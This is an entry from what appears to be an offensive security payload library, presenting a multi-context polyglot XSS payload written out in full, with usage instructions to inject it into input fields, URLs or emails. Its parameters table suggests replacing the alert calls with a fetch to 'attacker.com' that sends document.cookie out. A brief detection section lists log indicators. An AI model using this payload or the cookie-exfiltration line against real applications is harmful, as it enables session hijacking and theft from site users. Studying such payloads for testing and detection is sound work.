---
id: d31923a6-179b-4f3d-b3f0-dd728a5bc5e4
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:42.285993+00:00'
updated_at: '2023-04-10T20:21:55.867714+00:00'
tags:
  - xss
  - polyglot
  - html
platforms:
  - Web
validated: true
---

# Multi-Context-Polyglot-XSS-Payload

## Code

```javascript
">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
```

## Description

A polyglot payload designed to execute in HTML, email, and form contexts using elements like marquee, plaintext, and isindex to break out and trigger onerror or onmouseover events for XSS.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| confirm(1), prompt(1), alert(1) | POC alerts; replace with exfil code | fetch('http://attacker.com', {method:'POST', body:document.cookie}) |

## Usage

Inject into input fields, URLs, or emails where the app reflects user input. It exploits multiple parsers to ensure execution even if one context is sanitized.

## Detection

- Logs showing malformed HTML tags like <plaintext> or <isindex>.
- Anomalous image src with onerror handlers.
- JS execution in non-script contexts.

## Related

- [[procedures/Polyglot-XSS-Attack-using-SVG-Image-Injection]]
